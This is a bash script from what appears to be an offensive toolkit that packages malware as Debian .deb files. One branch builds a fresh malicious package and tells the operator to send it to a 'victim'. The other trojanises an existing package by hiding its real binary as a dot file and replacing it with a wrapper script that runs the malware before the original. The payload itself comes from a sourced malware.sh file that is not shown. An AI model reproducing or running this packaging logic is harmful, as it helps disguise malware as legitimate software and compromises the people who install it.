# Create a Debpackage


source ${PWD}/misc/malware.sh
control(){
    while read line;do
	$line
    done << EOF > ${fileName}$vnum$vnumber/DEBIAN/control
echo Package: ${fileName}
echo Maintainer: <${email}>
echo Version: $vnumber
echo Architecture: all
echo Description: $description
EOF
}


createMalDeb() {
    while printf "\n${open}${light}${green}Create a new %s package for the Malware?[y|n]: ${close}" \
		 "${pPackage}"; \
	  read $opt -e inmissile
    do
	printf "\n"
       
	case $inmissile in
	    y|Y)	malwareDir="malware"

			printf "\n${open}${light}${yellow}[!]Creating Directories and files, Please wait...${close}\n\n"
			
			mkdir "$malwareDir"
			
			cd "$_"
			
			mkdir -p usr/local/bin && mkdir DEBIAN
			cd usr/local/bin
			
			chk_file
			packagedetails
			cd ../../../../
			
			mv "${malwareDir}" "${fileName}$vnum$vnumber"
			cd "$(pwd)/${fileName}$vnum$vnumber/usr/local/bin/"
			

			
			cd ../../../../
			control
			dpkg-deb --build "${fileName}$vnum$vnumber" &>/dev/null &
			stat=$?
			wait %1
			
			if [[ $stat != 0 ]];then
			    
			    printf "${open}${light}%s${red}${close}\n" "Fatal Error"
			    rm -rf "${fileName}$vnum$vnumber"
			    printf "${open}${light}${red}Error encountered while building debian package${close}\n"
			    exit 1
			    
			fi
			
			printf "${open}${light}${green}You can now send the deb file to your victim ${close}\n"
			rm -rf "${fileName}$vnum$vnumber"
			break
			;;
	    n|N)
		while :;do
		    printf "${open}${bold}${green}%s${close}" \
			   "Specify the package to attach malware too: " ; read -e attachToPackage
		    printf "\n"
		    
		    [[ -z "${attachToPackage}" ]] && continue # Check if attachToPackage is null
		    
		    # The file command will show you the type of file $attachToPackage is
		    local checkIfDeb=$(file $attachToPackage)  

		    if [[ "${checkIfDeb}" =~ "Debian binary package" ]];then
			
			# Extract the debian pacakage in the current directory
			dpkg-deb --raw-extract "${attachToPackage}" . 

			# extract the name of the pacakge
			packageName="${attachToPackage%%_*}"
			
			# move into the /usr/bin folder of the package
			
			if [[ -d "${PWD}/usr/bin/" ]];then
			    cd "${PWD}/usr/bin/"
			    dirfile="tempScript.sh"

			    # rename the packageName tto a . file so it will be hidden
			    mv "${packageName}" ".${packageName}"
			    # Put the package name in the last end of the script
			    
			    echo "/usr/bin/.${packageName}" >> "${dirfile}"
			    chk_file
			    mv ${dirfile%%.*} "${packageName}"
			    cd -
			    mkdir ${attachToPackage%.deb*}
			    mv DEBIAN usr/ ${attachToPackage%.deb*}
			    dpkg --build ${attachToPackage%.deb*} 1>/dev/null 
			    local status=$?
			    
			    (( status != 0 )) && {
				
				rm -rf ${attachToPackage%.deb*}
				printf "${open}${bold}${red}%s${close}\n" \
				       "Fatal Error While packaging ${attachToPackage%.deb*}"
				return 1;
				
			    }
			    
			    rm -rf ${attachToPackage%.deb*}
			    return 0;
			    
			fi

			
			printf "${open}${bold}${yellow}%s{close}\n" \
			       "[!]${attachToPackage} does not have a usr/bin directory"
			exit 2
			    
			
			
		    fi
		    
		    printf "${open}${bold}${yellow}%s${close}\n" "[!]${attachToPackage} is not a debian package"
		    
		    continue ;
		done
		      
		;;
	    *)
		printf "${open}${light}${red}%s${close}" "Invalid Response" && continue ;;
	esac
    done   
}
